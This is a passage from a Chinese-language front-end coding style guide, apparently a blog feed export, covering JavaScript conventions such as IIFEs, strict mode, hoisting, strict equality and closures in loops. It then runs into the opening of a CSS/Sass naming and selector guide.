<p>无论何时，想要创建一个新的封闭的定义域，那就用 IIFE。它不仅避免了干扰，也使得内存在执行完后立即释放。</p>
<p>所有脚本文件建议都从 IIFE 开始。</p>
<p>立即执行的函数表达式的执行括号应该写在外包括号内。虽然写在内还是写在外都是有效的，但写在内使得整个表达式看起来更像一个整体，因此推荐这么做。</p>
<p><strong>不推荐</strong></p>
<pre><code>(function(){})();
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>(function(){}());
</code></pre>
<p>so，用下列写法来格式化你的 IIFE 代码：</p>
<pre><code>(function(){
  'use strict';

  // Code goes here

}());
</code></pre>
<p>如果你想引用全局变量或者是外层 IIFE 的变量，可以通过下列方式传参：</p>
<pre><code>(function($, w, d){
  'use strict';

  $(function() {
    w.alert(d.querySelectorAll('div').length);
  });
}(jQuery, window, document));
</code></pre>
<hr />
<h3 id="严格模式"><a class="markdownIt-Anchor" href="#严格模式"></a> 严格模式</h3>
<p>ECMAScript 5 严格模式可在整个脚本或独个方法内被激活。它对应不同的 javascript 语境会做更加严格的错误检查。严格模式也确保了 javascript 代码更加的健壮，运行的也更加快速。</p>
<p>严格模式会阻止使用在未来很可能被引入的预留关键字。</p>
<p>你应该在你的脚本中启用严格模式，最好是在独立的 IIFE 中应用它。避免在你的脚本第一行使用它而导致你的所有脚本都启动了严格模式，这有可能会引发一些第三方类库的问题。</p>
<p><strong>不推荐</strong></p>
<pre><code>// Script starts here
'use strict';

(function(){

  // Your code starts here

}());
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>(function(){
  'use strict';

  // Your code starts here

}());
</code></pre>
<hr />
<h3 id="变量声明"><a class="markdownIt-Anchor" href="#变量声明"></a> 变量声明</h3>
<p>总是使用 <code>var</code> 来声明变量。如不指定 var，变量将被隐式地声明为全局变量，这将对变量难以控制。如果没有声明，变量处于什么定义域就变得不清（可以是在 Document 或 Window 中，也可以很容易地进入本地定义域）。所以，请总是使用 var 来声明变量。</p>
<p>采用严格模式带来的好处是，当你手误输入错误的变量名时，它可以通过报错信息来帮助你定位错误出处。</p>
<p><strong>不推荐</strong></p>
<pre><code>x = 10;
y = 100;
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>var x = 10,
    y = 100;
</code></pre>
<hr />
<h3 id="理解-javascript-的定义域和定义域提升"><a class="markdownIt-Anchor" href="#理解-javascript-的定义域和定义域提升"></a> 理解 JavaScript 的定义域和定义域提升</h3>
<p>在 JavaScript 中变量和方法定义会自动提升到执行之前。JavaScript 只有 function 级的定义域，而无其他很多编程语言中的块定义域，所以使得你在某一 function 内的某语句和循环体中定义了一个变量，此变量可作用于整个 function 内，而不仅仅是在此语句或循环体中，因为它们的声明被 JavaScript 自动提升了。</p>
<p>我们通过例子来看清楚这到底是怎么一回事：</p>
<p><strong>原 function</strong></p>
<pre><code>(function(log){
  'use strict';

  var a = 10;

  for(var i = 0; i &amp;lt; a; i++) {
    var b = i * i;
    log(b);
  }

  if(a === 10) {
    var f = function() {
      log(a);
    };
    f();
  }

  function x() {
    log('Mr. X!');
  }
  x();

}(window.console.log));
</code></pre>
<p><strong>被 JS 提升过后</strong></p>
<pre><code>(function(log){
  'use strict';
  // All variables used in the closure will be hoisted to the top of the function
  var a,
      i,
      b,
      f;
  // All functions in the closure will be hoisted to the top
  function x() {
    log('Mr. X!');
  }

  a = 10;

  for(i = 0; i &amp;lt; a; i++) {
    b = i * i;
    log(b);
  }

  if(a === 10) {
    // Function assignments will only result in hoisted variables but the function body will not be hoisted
    // Only by using a real function declaration the whole function will be hoisted with its body
    f = function() {
      log(a);
    };
    f();
  }

  x();

}(window.console.log));
</code></pre>
<p>根据以上提升过程，你是否可理解以下代码？</p>
<p><strong>有效代码</strong></p>
<pre><code>(function(log){
  'use strict';

  var a = 10;

  i = 5;

  x();

  for(var i; i &amp;lt; a; i++) {
    log(b);
    var b = i * i;
  }

  if(a === 10) {
    f = function() {
      log(a);
    };
    f();

    var f;
  }

  function x() {
    log('Mr. X!');
  }

}(window.console.log));
</code></pre>
<p>正如你所看到的这段令人充满困惑与误解的代码导致了出人意料的结果。只有良好的声明习惯，也就是下一章节我们要提到的声明规则，才能尽可能的避免这类错误风险。</p>
<hr />
<p>提升声明</p>
<p>为避免上一章节所述的变量和方法定义被自动提升造成误解，把风险降到最低，我们应该手动地显示地去声明变量与方法。也就是说，所有的变量以及方法，应当定义在 function 内的首行。</p>
<p>只用一个 <code>var</code> 关键字声明，多个变量用逗号隔开。</p>
<p><strong>不推荐</strong></p>
<pre><code>(function(log){
  'use strict';

  var a = 10;
  var b = 10;

  for(var i = 0; i &amp;lt; 10; i++) {
    var c = a * b * i;
  }

  function f() {

  }

  var d = 100;
  var x = function() {
    return d * d;
  };
  log(x());

}(window.console.log));
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>(function(log){
  'use strict';

  var a = 10,
      b = 10,
      i,
      c,
      d,
      x;

  function f() {

  }

  for(i = 0; i &amp;lt; 10; i++) {
    c = a * b * i;
  }



  d = 100;
  x = function() {
    return d * d;
  };
  log(x());

}(window.console.log));
</code></pre>
<p>把赋值尽量写在变量申明中。</p>
<p><strong>不推荐</strong></p>
<pre><code>var a,
    b,
    c;

a = 10;
b = 10;
c = 100;
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>var a = 10,
    b = 10,
    c = 100;
</code></pre>
<h3 id="总是使用带类型判断的比较判断"><a class="markdownIt-Anchor" href="#总是使用带类型判断的比较判断"></a> 总是使用带类型判断的比较判断</h3>
<p>总是使用 <code>===</code> 精确的比较操作符，避免在判断的过程中，由 JavaScript 的强制类型转换所造成的困扰。</p>
<p>如果你使用 <code>===</code> 操作符，那比较的双方必须是同一类型为前提的条件下才会有效。</p>
<p>如果你想了解更多关于强制类型转换的信息，你可以读一读 <a href="http://dmitrysoshnikov.com/notes/note-2-ecmascript-equality-operators/" target="_blank" rel="noopener">Dmitry Soshnikov 的这篇文章</a>。</p>
<p>在只使用 <code>==</code> 的情况下，JavaScript 所带来的强制类型转换使得判断结果跟踪变得复杂，下面的例子可以看出这样的结果有多怪了：</p>
<pre><code>(function(log){
  'use strict';

  log('0' == 0); // true
  log('' == false); // true
  log('1' == true); // true
  log(null == undefined); // true

  var x = {
    valueOf: function() {
      return 'X';
    }
  };

  log(x == 'X');

}(window.console.log));
</code></pre>
<hr />
<h3 id="明智地使用真假判断"><a class="markdownIt-Anchor" href="#明智地使用真假判断"></a> 明智地使用真假判断</h3>
<p>当我们在一个 if 条件语句中使用变量或表达式时，会做真假判断。<code>if(a == true)</code> 是不同于 <code>if(a)</code> 的。后者的判断比较特殊，我们称其为真假判断。这种判断会通过特殊的操作将其转换为 true 或 false，下列表达式统统返回 false：<code>false</code>, <code>0</code>, <code>undefined</code>, <code>null</code>, <code>NaN</code>, <code>''</code>（空字符串）.</p>
<p>这种真假判断在我们只求结果而不关心过程的情况下，非常的有帮助。</p>
<p>以下示例展示了真假判断是如何工作的：</p>
<pre><code>(function(log){
  'use strict';

  function logTruthyFalsy(expr) {
    if(expr) {
      log('truthy');
    } else {
      log('falsy');
    }
  }

  logTruthyFalsy(true); // truthy
  logTruthyFalsy(1); // truthy
  logTruthyFalsy({}); // truthy
  logTruthyFalsy([]); // truthy
  logTruthyFalsy('0'); // truthy

  logTruthyFalsy(false); // falsy
  logTruthyFalsy(0); // falsy
  logTruthyFalsy(undefined); // falsy
  logTruthyFalsy(null); // falsy
  logTruthyFalsy(NaN); // falsy
  logTruthyFalsy(''); // falsy

}(window.console.log));
</code></pre>
<hr />
<h3 id="变量赋值时的逻辑操作"><a class="markdownIt-Anchor" href="#变量赋值时的逻辑操作"></a> 变量赋值时的逻辑操作</h3>
<p>逻辑操作符 <code>||</code> 和 <code>&amp;amp;&amp;amp;</code> 也可被用来返回布尔值。如果操作对象为非布尔对象，那每个表达式将会被自左向右地做真假判断。基于此操作，最终总有一个表达式被返回回来。这在变量赋值时，是可以用来简化你的代码的。</p>
<p><strong>不推荐</strong></p>
<pre><code>if(!x) {
  if(!y) {
    x = 1;
  } else {
    x = y;
  }
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>x = x || y || 1;
</code></pre>
<p>这一小技巧经常用来给方法设定默认的参数。</p>
<pre><code>(function(log){
  'use strict';

  function multiply(a, b) {
    a = a || 1;
    b = b || 1;

    log('Result ' + a * b);
  }

  multiply(); // Result 1
  multiply(10); // Result 10
  multiply(3, NaN); // Result 3
  multiply(9, 5); // Result 45

}(window.console.log));
</code></pre>
<hr />
<h3 id="分号"><a class="markdownIt-Anchor" href="#分号"></a> 分号</h3>
<p>总是使用分号，因为隐式的代码嵌套会引发难以察觉的问题。当然我们更要从根本上来杜绝这些问题<a href="https://github.com/gionkunz/chartist-js/blob/develop/CODINGSTYLE.md" target="_blank" rel="noopener">1</a> 。以下几个示例展示了缺少分号的危害：</p>
<pre><code>// 1.
MyClass.prototype.myMethod = function() {
  return 42;
}  // No semicolon here.

(function() {
  // Some initialization code wrapped in a function to create a scope for locals.
})();


var x = {
  'i': 1,
  'j': 2
}  // No semicolon here.

// 2.  Trying to do one thing on Internet Explorer and another on Firefox.
// I know you'd never write code like this, but throw me a bone.
[ffVersion, ieVersion][isIE]();


var THINGS_TO_EAT = [apples, oysters, sprayOnCheese]  // No semicolon here.

// 3. conditional execution a la bash
-1 == resultOfOperation() || die();
</code></pre>
<p><strong>So what happens?</strong></p>
<ol>
<li>JavaScript 错误 —— 首先返回 42 的那个 function 被第二个 function 当中参数传入调用，接着数字 42 也被&quot;调用&quot;而导致出错。</li>
<li>八成你会得到 ‘no such property in undefined’ 的错误提示，因为在真实环境中的调用是这个样子：<code>x[ffVersion, ieVersion][isIE]()</code>.</li>
<li><code>die</code> 总是被调用。因为数组减 1 的结果是 <code>NaN</code>，它不等于任何东西（无论 <code>resultOfOperation</code> 是否返回 <code>NaN</code>）。所以最终的结果是 <code>die()</code> 执行完所获得值将赋给 <code>THINGS_TO_EAT</code>.</li>
</ol>
<p><strong>Why?</strong></p>
<p>JavaScript 中语句要以分号结束，否则它将会继续执行下去，不管换不换行。以上的每一个示例中，函数声明或对象或数组，都变成了在一句语句体内。要知道闭合圆括号并不代表语句结束，JavaScript 不会终结语句，除非它的下一个 token 是一个中缀符<a href="http://dmitrysoshnikov.com/notes/note-2-ecmascript-equality-operators/" target="_blank" rel="noopener">2</a> 或者是圆括号操作符。</p>
<p>这真是让人大吃一惊，所以乖乖地给语句末加上分号吧。</p>
<p><strong>澄清：分号与函数</strong></p>
<p>分号需要用在表达式的结尾，而并非函数声明的结尾。区分它们最好的例子是：</p>
<pre><code>var foo = function() {
  return true;
};  // semicolon here.

function foo() {
  return true;
}  // no semicolon here.
</code></pre>
<hr />
<h3 id="嵌套函数"><a class="markdownIt-Anchor" href="#嵌套函数"></a> 嵌套函数</h3>
<p>嵌套函数是非常有用的，比如用在持续创建和隐藏辅助函数的任务中。你可以非常自由随意地使用它们。</p>
<hr />
<h3 id="语句块内的函数声明"><a class="markdownIt-Anchor" href="#语句块内的函数声明"></a> 语句块内的函数声明</h3>
<p>切勿在语句块内声明函数，在 ECMAScript 5 的严格模式下，这是不合法的。函数声明应该在定义域的顶层。但在语句块内可将函数申明转化为函数表达式赋值给变量。</p>
<p><strong>不推荐</strong></p>
<pre><code>if (x) {
  function foo() {}
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>if (x) {
  var foo = function() {};
}
</code></pre>
<hr />
<h3 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h3>
<p>基本上你无法避免出现异常，特别是在做大型开发时（使用应用开发框架等等）。</p>
<p>在没有自定义异常的情况下，从有返回值的函数中返回错误信息一定非常的棘手，更别提多不优雅了。不好的解决方案包括了传第一个引用类型来接纳错误信息，或总是返回一个对象列表，其中包含着可能的错误对象。以上方式基本上是比较简陋的异常处理方式。适时可做自定义异常处理。</p>
<p>在复杂的环境中，你可以考虑抛出对象而不仅仅是字符串（默认的抛出值）。</p>
<pre><code>if(name === undefined) {
  throw {
    name: 'System Error',
    message: 'A name should always be specified!'
  }
}
</code></pre>
<hr />
<h3 id="标准特性"><a class="markdownIt-Anchor" href="#标准特性"></a> 标准特性</h3>
<p>总是优先考虑使用标准特性。为了最大限度地保证扩展性与兼容性，总是首选标准的特性，而不是非标准的特性（例如：首选 <code>string.charAt(3)</code> 而不是 <code>string[3]</code>；首选 DOM 的操作方法来获得元素引用，而不是某一应用特定的快捷方法）。</p>
<hr />
<h3 id="简易的原型继承"><a class="markdownIt-Anchor" href="#简易的原型继承"></a> 简易的原型继承</h3>
<p>如果你想在 JavaScript 中继承你的对象，请遵循一个简易的模式来创建此继承。如果你预计你会遇上复杂对象的继承，那可以考虑采用一个继承库，比如 <a href="https://github.com/rauschma/proto-js" target="_blank" rel="noopener">Proto.js by Axel Rauschmayer</a>.</p>
<p>简易继承请用以下方式：</p>
<pre><code>(function(log){
  'use strict';

  // Constructor function
  function Apple(name) {
    this.name = name;
  }
  // Defining a method of apple
  Apple.prototype.eat = function() {
    log('Eating ' + this.name);
  };

  // Constructor function
  function GrannySmithApple() {
    // Invoking parent constructor
    Apple.prototype.constructor.call(this, 'Granny Smith');
  }
  // Set parent prototype while creating a copy with Object.create
  GrannySmithApple.prototype = Object.create(Apple.prototype);
  // Set constructor to the sub type, otherwise points to Apple
  GrannySmithApple.prototype.constructor = GrannySmithApple;

  // Calling a super method
  GrannySmithApple.prototype.eat = function() {
    // Be sure to apply it onto our current object with call(this)
    Apple.prototype.eat.call(this);

    log('Poor Grany Smith');
  };

  // Instantiation
  var apple = new Apple('Test Apple');
  var grannyApple = new GrannySmithApple();

  log(apple.name); // Test Apple
  log(grannyApple.name); // Granny Smith

  // Instance checks
  log(apple instanceof Apple); // true
  log(apple instanceof GrannySmithApple); // false

  log(grannyApple instanceof Apple); // true
  log(grannyApple instanceof GrannySmithApple); // true

  // Calling method that calls super method
  grannyApple.eat(); // Eating Granny SmithnPoor Grany Smith

}(window.console.log));
</code></pre>
<hr />
<h3 id="使用闭包"><a class="markdownIt-Anchor" href="#使用闭包"></a> 使用闭包</h3>
<p>闭包的创建也许是 JS 最有用也是最易被忽略的能力了。<a href="http://jibbering.com/faq/faq_notes/closures.html" target="_blank" rel="noopener">关于闭包如何工作的合理解释</a>。</p>
<hr />
<h3 id="切勿在循环中创建函数"><a class="markdownIt-Anchor" href="#切勿在循环中创建函数"></a> 切勿在循环中创建函数</h3>
<p>在简单的循环语句中加入函数是非常容易形成闭包而带来隐患的。下面的例子就是一个典型的陷阱：</p>
<p><strong>不推荐</strong></p>
<pre><code>(function(log, w){
  'use strict';

  // numbers and i is defined in the current function closure
  var numbers = [1, 2, 3],
      i;

  for(i = 0; i &amp;lt; numbers.length; i++) {
    w.setTimeout(function() {
      // At the moment when this gets executed the i variable, coming from the outer function scope
      // is set to 3 and the current program is alerting the message 3 times
      // 'Index 3 with number undefined
      // If you understand closures in javascript you know how to deal with those cases
      // It's best to just avoid functions / new closures in loops as this prevents those issues

      w.alert('Index ' + i + ' with number ' + numbers[i]);
    }, 0);
  }

}(window.console.log, window));
</code></pre>
<p>接下来的改进虽然已经解决了上述例子中的问题或 bug，但还是违反了不在循环中创建函数或闭包的原则。</p>
<p><strong>不推荐</strong></p>
<pre><code>(function(log, w){
  'use strict';

  // numbers and i is defined in the current function closure
  var numbers = [1, 2, 3],
      i;

  for(i = 0; i &amp;lt; numbers.length; i++) { // Creating a new closure scope with an IIFE solves the problem // The delayed function will use index and number which are // in their own closure scope (one closure per loop iteration). // --- // Still this is not recommended as we violate our rule to not // create functions within loops and we are creating two! (function(index, number){ w.setTimeout(function() { // Will output as expected 0 &amp;gt; 1, 1 &amp;gt; 2, 2 &amp;gt; 3
        w.alert('Index ' + index + ' with number ' + number);
      }, 0);
    }(i, numbers[i]));
  }

}(window.console.log, window));
</code></pre>
<p>接下来的改进已解决问题，而且也遵循了规范。可是，你会发现看上去似乎过于复杂繁冗了，应该会有更好的解决方案吧。</p>
<p><strong>不完全推荐</strong></p>
<pre><code>(function(log, w){
  'use strict';

  // numbers and i is defined in the current function closure
  var numbers = [1, 2, 3],
      i;

  // Create a function outside of the loop that will accept arguments to create a
  // function closure scope. This function will return a function that executes in this
  // closure parent scope.
  function alertIndexWithNumber(index, number) {
    return function() {
      w.alert('Index ' + index + ' with number ' + number);
    };
  }

  // First parameter is a function call that returns a function.
  // ---
  // This solves our problem and we don't create a function inside our loop
  for(i = 0; i &amp;lt; numbers.length; i++) {
    w.setTimeout(alertIndexWithNumber(i, numbers[i]), 0);
  }

}(window.console.log, window));
</code></pre>
<p>将循环语句转换为函数执行的方式问题能得到立马解决，每一次循环都会对应地创建一次闭包。函数式的风格更加值得推荐，而且看上去也更加地自然和可预料。</p>
<p><strong>推荐</strong></p>
<pre><code>(function(log, w){
  'use strict';

  // numbers and i is defined in the current function closure
  var numbers = [1, 2, 3],
      i;

  numbers.forEach(function(number, index) {
    w.setTimeout(function() {
      w.alert('Index ' + index + ' with number ' + number);
    }, 0);
  });

}(window.console.log, window));
</code></pre>
<hr />
<h3 id="eval-函数魔鬼"><a class="markdownIt-Anchor" href="#eval-函数魔鬼"></a> eval 函数（魔鬼）</h3>
<p><code>eval()</code> 不但混淆语境还很危险，总会有比这更好、更清晰、更安全的另一种方案来写你的代码，因此尽量不要使用 evil 函数。</p>
<hr />
<h3 id="this-关键字"><a class="markdownIt-Anchor" href="#this-关键字"></a> this 关键字</h3>
<p>只在对象构造器、方法和在设定的闭包中使用 <code>this</code> 关键字。this 的语义在此有些误导。它时而指向全局对象（大多数时），时而指向调用者的定义域（在 eval 中），时而指向 DOM 树中的某一节点（当用事件处理绑定到 HTML 属性上时），时而指向一个新创建的对象（在构造器中），还时而指向其它的一些对象（如果函数被 <code>call()</code> 和 <code>apply()</code> 执行和调用时）。</p>
<p>正因为它是如此容易地被搞错，请限制它的使用场景：</p>
<ul>
<li>在构造函数中</li>
<li>在对象的方法中（包括由此创建出的闭包内）</li>
</ul>
<hr />
<h3 id="首选函数式风格"><a class="markdownIt-Anchor" href="#首选函数式风格"></a> 首选函数式风格</h3>
<p>函数式编程让你可以简化代码并缩减维护成本，因为它容易复用，又适当地解耦和更少的依赖。</p>
<p>接下来的例子中，在一组数字求和的同一问题上，比较了两种解决方案。第一个例子是经典的程序处理，而第二个例子则是采用了函数式编程和 ECMA Script 5.1 的数组方法。</p>
<p>例外：往往在重代码性能轻代码维护的情况之下，要选择最优性能的解决方案而非维护性高的方案（比如用简单的循环语句代替 forEach）。</p>
<p><strong>不推荐</strong></p>
<pre><code>(function(log){
  'use strict';

  var arr = [10, 3, 7, 9, 100, 20],
      sum = 0,
      i;


  for(i = 0; i &amp;lt; arr.length; i++) {
    sum += arr[i];
  }

  log('The sum of array ' + arr + ' is: ' + sum)

}(window.console.log));
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>(function(log){
  'use strict';

  var arr = [10, 3, 7, 9, 100, 20];

  var sum = arr.reduce(function(prevValue, currentValue) {
    return prevValue + currentValue;
  }, 0);

  log('The sum of array ' + arr + ' is: ' + sum);

}(window.console.log));
</code></pre>
<p>另一个例子通过某一规则对一个数组进行过滤匹配来创建一个新的数组。</p>
<p><strong>不推荐</strong></p>
<pre><code>(function(log){
  'use strict';

  var numbers = [11, 3, 7, 9, 100, 20, 14, 10],
      numbersGreaterTen = [],
      i;


  for(i = 0; i &amp;lt; numbers.length; i++) { if(numbers[i] &amp;gt; 10) {
      numbersGreaterTen.push(numbers[i]);
    }
  }

  log('From the list of numbers ' + numbers + ' only ' + numbersGreaterTen + ' are greater than ten');

}(window.console.log));
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>(function(log){
  'use strict';

  var numbers = [11, 3, 7, 9, 100, 20, 14, 10];

  var numbersGreaterTen = numbers.filter(function(element) {
    return element &amp;gt; 10;
  });

  log('From the list of numbers ' + numbers + ' only ' + numbersGreaterTen + ' are greater than ten');

}(window.console.log));
</code></pre>
<hr />
<h3 id="使用-ecma-script-5"><a class="markdownIt-Anchor" href="#使用-ecma-script-5"></a> 使用 ECMA Script 5</h3>
<p>建议使用 ECMA Script 5 中新增的语法糖和函数。这将简化你的程序，并让你的代码更加灵活和可复用。</p>
<hr />
<h3 id="数组和对象的属性迭代"><a class="markdownIt-Anchor" href="#数组和对象的属性迭代"></a> 数组和对象的属性迭代</h3>
<p>用 ECMA5 的迭代方法来迭代数组。使用 <code>Array.forEach</code> 或者如果你要在特殊场合下中断迭代，那就用 <code>Array.every</code>。</p>
<pre><code>(function(log){
  'use strict';

  // Iterate over an array and break at a certain condition
  [1, 2, 3, 4, 5].every(function(element, index, arr) {
    log(element + ' at index ' + index + ' in array ' + arr);

    if(index !== 5) {
      return true;
    }
  });

  // Defining a simple javascript object
  var obj = {
    a: 'A',
    b: 'B',
    'c-d-e': 'CDE'
  };

  // Iterating over the object keys
  Object.keys(obj).forEach(function(element, index, arr) {
    log('Key ' + element + ' has value ' + obj[element]);
  });

}(window.console.log));
</code></pre>
<hr />
<h3 id="不要使用-switch"><a class="markdownIt-Anchor" href="#不要使用-switch"></a> 不要使用 switch</h3>
<p>switch 在所有的编程语言中都是个非常错误的难以控制的语句，建议用 if else 来替换它。</p>
<hr />
<h3 id="数组和对象字面量"><a class="markdownIt-Anchor" href="#数组和对象字面量"></a> 数组和对象字面量</h3>
<p>用数组和对象字面量来代替数组和对象构造器。数组构造器很容易让人在它的参数上犯错。</p>
<p><strong>不推荐</strong></p>
<pre><code>// Length is 3.
var a1 = new Array(x1, x2, x3);

// Length is 2.
var a2 = new Array(x1, x2);

// If x1 is a number and it is a natural number the length will be x1.
// If x1 is a number but not a natural number this will throw an exception.
// Otherwise the array will have one element with x1 as its value.
var a3 = new Array(x1);

// Length is 0.
var a4 = new Array();
</code></pre>
<p>正因如此，如果将代码传参从两个变为一个，那数组很有可能发生意料不到的长度变化。为避免此类怪异状况，请总是采用更多可读的数组字面量。</p>
<p><strong>推荐</strong></p>
<pre><code>var a = [x1, x2, x3];
var a2 = [x1, x2];
var a3 = [x1];
var a4 = [];
</code></pre>
<p>对象构造器不会有类似的问题，但是为了可读性和统一性，我们应该使用对象字面量。</p>
<p><strong>不推荐</strong></p>
<pre><code>var o = new Object();

var o2 = new Object();
o2.a = 0;
o2.b = 1;
o2.c = 2;
o2['strange key'] = 3;
</code></pre>
<p>应该写成这样：</p>
<p><strong>推荐</strong></p>
<pre><code>var o = {};

var o2 = {
  a: 0,
  b: 1,
  c: 2,
  'strange key': 3
};
</code></pre>
<hr />
<h3 id="修改内建对象的原型链"><a class="markdownIt-Anchor" href="#修改内建对象的原型链"></a> 修改内建对象的原型链</h3>
<p>修改内建的诸如 <code>Object.prototype</code> 和 <code>Array.prototype</code> 是被严厉禁止的。修改其它的内建对象比如 <code>Function.prototype</code>，虽危害没那么大，但始终还是会导致在开发过程中难以 debug 的问题，应当也要避免。</p>
<hr />
<h3 id="自定义-tostring-方法"><a class="markdownIt-Anchor" href="#自定义-tostring-方法"></a> 自定义 toString() 方法</h3>
<p>你可以通过自定义 <code>toString()</code> 来控制对象字符串化。这很好，但你必须保证你的方法总是成功并不会有其它副作用。如果你的方法达不到这样的标准，那将会引发严重的问题。如果 <code>toString()</code> 调用了一个方法，这个方法做了一个断言<a href="https://github.com/rauschma/proto-js" target="_blank" rel="noopener">3</a> ，当断言失败，它可能会输出它所在对象的名称，当然对象也需要调用 <code>toString()</code>。</p>
<hr />
<h3 id="圆括号"><a class="markdownIt-Anchor" href="#圆括号"></a> 圆括号</h3>
<p>一般在语法和语义上真正需要时才谨慎地使用圆括号。不要用在一元操作符上，例如 <code>delete</code>, <code>typeof</code> 和 <code>void</code>，或在关键字之后，例如 <code>return</code>, <code>throw</code>, <code>case</code>, <code>new</code> 等。</p>
<hr />
<h3 id="字符串"><a class="markdownIt-Anchor" href="#字符串"></a> 字符串</h3>
<p>统一使用单引号(’)，不使用双引号(&quot;)。这在创建 HTML 字符串非常有好处：</p>
<pre><code>    var msg = 'This is some HTML &lt;div class=&quot;makes-sense&quot;&gt;&lt;/div&gt;';
</code></pre>
<hr />
<h3 id="三元条件判断if-的快捷方法"><a class="markdownIt-Anchor" href="#三元条件判断if-的快捷方法"></a> 三元条件判断（if 的快捷方法）</h3>
<p>用三元操作符分配或返回语句。在比较简单的情况下使用，避免在复杂的情况下使用。没人愿意用 10 行三元操作符把自己的脑子绕晕。</p>
<p><strong>不推荐</strong></p>
<pre><code>if(x === 10) {
  return 'valid';
} else {
  return 'invalid';
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>return x === 10 ? 'valid' : 'invalid';
</code></pre>
<hr />
<p><a href="https://github.com/gionkunz/chartist-js/blob/develop/CODINGSTYLE.md" target="_blank" rel="noopener">1</a>：作者指的是采用严格规范的语句写法，从根本上杜绝由分号缺失而引起的代码歧义。</p>
<p><a href="http://dmitrysoshnikov.com/notes/note-2-ecmascript-equality-operators/" target="_blank" rel="noopener">2</a>：中缀符，指的是像 <code>x + y</code> 中的 <code>+</code>。</p>
<p><a href="https://github.com/rauschma/proto-js" target="_blank" rel="noopener">3</a>：断言一般指程序员在测试测序时的假设，一般是一些布尔表达式，当返回是 true 时，断言为真，代码运行会继续进行；如果条件判断为 false，代码运行停止，你的应用被终止。</p>
<hr />
]]></content>
      <categories>
        <category>前端编码规范</category>
        <category>Front-End&quot;</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>编码规范</tag>
      </tags>
  </entry>
  <entry>
    <title>前端编码风格规范(4) 之 CSS 和 Sass (SCSS)</title>
    <url>/hexolog/post/40468678.html</url>
    <content><![CDATA[<blockquote>
<p>英文原文：<a href="http://newimg88.b0.upaiyun.com/newimg88/2015/01/web-styleguide-4.jpg" target="_blank" rel="noopener">Web Styleguide – Style guide to harmonize HTML, Javascript and CSS / SASS coding style</a></p>
</blockquote>
<h2 id="css-and-sass-scss-style-rules"><a class="markdownIt-Anchor" href="#css-and-sass-scss-style-rules"></a> CSS and Sass (SCSS) style rules</h2>
<hr />
<h3 id="id-and-class-naming"><a class="markdownIt-Anchor" href="#id-and-class-naming"></a> ID and class naming</h3>
<p>ID和class(类)名总是使用可以反应元素目的和用途的名称，或其他通用名称。代替表象和晦涩难懂的名称。</p>
<p>应该首选具体和反映元素目的的名称，因为这些是最可以理解的，而且发生变化的可能性最小。</p>
<p>通用名称只是多个元素的备用名，他们兄弟元素之间是一样的，没有特别意义。<br />
区分他们，使他们具有特殊意义，通常需要为&quot;帮手&quot;。</p>
<p>尽管class(类)名和ID 的语义化对于计算机解析来说没有什么实际的意义，<br />
语义化的名称 通常是正确的选择，因为它们所代表的信息含义，不包含表现的限制。</p>
<a id="more"></a>
<p><strong>不推荐</strong></p>
<pre><code>.fw-800 {
  font-weight: 800;
}

.red {
  color: red;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.heavy {
  font-weight: 800;
}

.important {
  color: red;
}
</code></pre>
<hr />
<h3 id="合理的避免使用id"><a class="markdownIt-Anchor" href="#合理的避免使用id"></a> 合理的避免使用ID</h3>
<p>一般情况下ID不应该被应用于样式。<br />
ID的样式不能被复用并且每个页面中你只能使用一次ID。<br />
使用ID唯一有效的是确定网页或整个站点中的位置。<br />
尽管如此，你应该始终考虑使用class，而不是id，除非只使用一次。</p>
<p><strong>不推荐</strong></p>
<pre><code>#content .title {
  font-size: 2em;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.content .title {
  font-size: 2em;
}
</code></pre>
<p>另一个反对使用ID的观点是含有ID选择器权重很高。<br />
一个只包含一个ID选择器权重高于包含1000个class(类)名的选择器，这使得它很奇怪。</p>
<pre><code>// 这个选择器权重高于下面的选择器
#content .title {
  color: red;
}

// than this selector!
html body div.content.news-content .title.content-title.important {
  color: blue;
}
</code></pre>
<hr />
<h3 id="css选择器中避免标签名"><a class="markdownIt-Anchor" href="#css选择器中避免标签名"></a> CSS选择器中避免标签名</h3>
<p>当构建选择器时应该使用清晰， 准确和有语义的class(类)名。不要使用标签选择器。 如果你只关心你的class(类)名<br />
，而不是你的代码元素，这样会更容易维护。</p>
<p>从分离的角度考虑,在表现层中不应该分配html标记/语义。<br />
它可能是一个有序列表需要被改成一个无序列表，或者一个div将被转换成article。<br />
如果你只使用具有实际意义的class(类)名，<br />
并且不使用元素选择器，那么你只需要改变你的html标记，而不用改动你的CSS。</p>
<p><strong>不推荐</strong></p>
<pre><code>div.content &gt; header.content-header &gt; h2.title {
  font-size: 2em;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.content &gt; .content-header &gt; .title {
  font-size: 2em;
}
</code></pre>
<hr />
<h3 id="尽可能的精确"><a class="markdownIt-Anchor" href="#尽可能的精确"></a> 尽可能的精确</h3>
<p>很多前端开发人员写选择器链的时候不使用 直接子选择器（注：直接子选择器和后代选择器的区别）。<br />
有时，这可能会导致疼痛的设计问题并且有时候可能会很耗性能。<br />
然而，在任何情况下，这是一个非常不好的做法。<br />
如果你不写很通用的，需要匹配到DOM末端的选择器， 你应该总是考虑直接子选择器。</p>
<p>考虑下面的DOM:</p>
<pre><code>  News event
  

    

      Check this out
</code></pre>
<p>This is a news article content</p>
<p>Buy this</p>
<p>Yey!</p>
<p>下面的CSS将应用于有title类的全部三个元素。<br />
然后，要解决content类下的title类 和 teaser类下的title类下不同的样式，这将需要更精确的选择器再次重写他们的样式。</p>
<p><strong>不推荐</strong></p>
<pre><code>.content .title {
  font-size: 2rem;
}
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>.content &gt; .title {
  font-size: 2rem;
}

.content &gt; .content-body &gt; .title {
  font-size: 1.5rem;
}

.content &gt; .content-body &gt; .teaser &gt; .title {
